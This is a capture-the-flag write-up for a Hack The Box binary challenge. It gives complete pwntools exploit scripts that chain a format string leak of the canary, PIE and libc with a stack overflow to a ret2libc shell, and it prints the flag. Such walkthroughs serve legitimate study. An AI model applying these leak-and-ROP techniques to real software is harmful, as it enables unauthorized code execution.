# What does the f say?
> Write-up author: jon-brandy
## DESCRIPTION:

Tired from exploring the endless mysteries of space, you need some rest and a welcome distraction. 
From extreme flaming kamikazes to dangleberry sours, Fox space bar has everything. 
Treat yourself like a king, but be careful! Don't drink and teleport!

## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```
┌──(brandy㉿bread-yolk)-[~/Downloads/htb-active]
└─$ file what_does_the_f_say        
what_does_the_f_say: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd622e290e6b1ac53e66369b85805ccd8a593fd0, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f2af0ef9-98f1-4fd9-9533-49afab1b46dd)


2. After decompiled the binary, found a FSB vuln at `drinks_menu()` symbol.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/869d9651-bef9-45c9-bc48-8d43f3d9d435)


3. Noticed we can use utilize this bug again and again (because of the do-while loop).
4. Things to note, **RELRO IS FULL**, hence we can't overwrite **Global Offset Table**.
5. Reviewing the code, shall found the potential BOF at the `warning()` symbol.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0b3545b7-5610-4a4d-8442-c9c0a4ce1db1)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9ef394c8-c981-4c5c-b3ee-0d27b5f0512f)


6. In order to get inside the potential bof section, we need to spend rocks until below 20.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/965b691f-10f8-4e95-b7d6-68afcdfe8bf3)


7. Great! Hence we just need to spam rocks request until our rocks stock is under 20.

### FLOW

```
1. Leak canary values (because there's stack protection).
2. Leak PIE --> calculate PIE BASE (because PIE Enabled, hence we need to calc the pie base in order to access gadgets).
3. Leak libc --> calculate LIBC BASE (because we want to do RET2LIBC).
```

EXPLOIT MOMENT:

```
RET2LIBC PAYLOAD
Padding + canary + junk + stack_align + rdi + /bin/sh + libc.sym.system
```

8. After leaked the libc address at the remote server (to make it easier to guess the libc version, I leaked the `__libc_start_main_ret`.

> POSSIBLE LIBC VERSION

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/41d39f4c-5238-4a39-ae98-b822ca6498d4)


9. Anyway to grab the correct libc, (**SPOILER**) kinda lazy to leak `IO_STDIN`, `IO_STDOUT`, etc. So I just tried every one of them to get the shell.
10. I won't shows the trial and error to get the correct LIBC address, because I got the correct one by bruteforcing them, which one's get me the shell is the correct one.
11. Here's the script so far:

> 1/2 SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './what_does_the_f_say_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def pie_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def libc_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def canary_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

sh = start()
# pause()

leak_pie = pie_leak(15)
info(f'LEAKED PIE BASE: {hex(leak_pie)}')
elf.address = leak_pie - 0x174a
success(f'PIE_BASE --> {hex(elf.address)}')

libc_addr = libc_leak(25)
info(f'LIBC --> {hex(libc_addr)}')
libc.address = libc_addr - 0x21b97
success(f'LIBC_BASE --> {hex(libc.address)}')

# canary = canary_leak(23)
canary = canary_leak(13)
success(f'CANARY --> {hex(canary)}')

'''
pwndbg> x/i 0x7fbbef13d18a
   0x7fbbef13d18a <__libc_start_call_main+122>: mov    edi,eax
pwndbg> x/gw 0x7fbbef13d18a
0x7fbbef13d18a <__libc_start_call_main+122>:    0xffe8c789
pwndbg>s
'''

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret']).address
success(f'RDI GADGET --> {hex(rdi)}')

ret = rop.find_gadget(['ret']).address
success(f'RET GADGET --> {hex(ret)}')

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/19c11bca-ff60-49ef-9d81-dfc4cb38fee0)


12. Awesome! Let's spend all the rocks now and send our payload.

> FULL SCRIPT

```
from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './what_does_the_f_say_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def pie_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def libc_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def canary_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def spend_rocks():
    sh.sendline(b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

def get_inside_vuln():
    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'2')
    sh.sendline(b'aa')

sh = start()
# pause()

leak_pie = pie_leak(15)
info(f'LEAKED PIE BASE: {hex(leak_pie)}')
elf.address = leak_pie - 0x174a
success(f'PIE_BASE --> {hex(elf.address)}')

libc_addr = libc_leak(25)
info(f'LIBC --> {hex(libc_addr)}')
libc.address = libc_addr - 0x21b97
success(f'LIBC_BASE --> {hex(libc.address)}')

# canary = canary_leak(23)
canary = canary_leak(13)
success(f'CANARY --> {hex(canary)}')

'''
pwndbg> x/i 0x7fbbef13d18a
   0x7fbbef13d18a <__libc_start_call_main+122>: mov    edi,eax
pwndbg> x/gw 0x7fbbef13d18a
0x7fbbef13d18a <__libc_start_call_main+122>:    0xffe8c789
pwndbg>s
'''

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret']).address
success(f'RDI GADGET --> {hex(rdi)}')

ret = rop.find_gadget(['ret']).address
success(f'RET GADGET --> {hex(ret)}')

spend_rocks()

p = flat([
    asm('nop') * 0x18,
    canary,
    asm('nop') * 0x8,
    ret,
    rdi,
    next(libc.search(b'/bin/sh')),
    # ret,
    libc.sym['system']
])

get_inside_vuln()

sh.sendlineafter(b'?', p)
sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ebe5f276-453c-4a57-807a-55cbd0649a4a)


13. Let's send it remotely!

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4530b91c-ad88-40c2-b022-1e4b9a77a580)


14. Got the flag!

## FLAG

```
HTB{th3_f_s4ys_f0rm4t_str1ng!!}
```
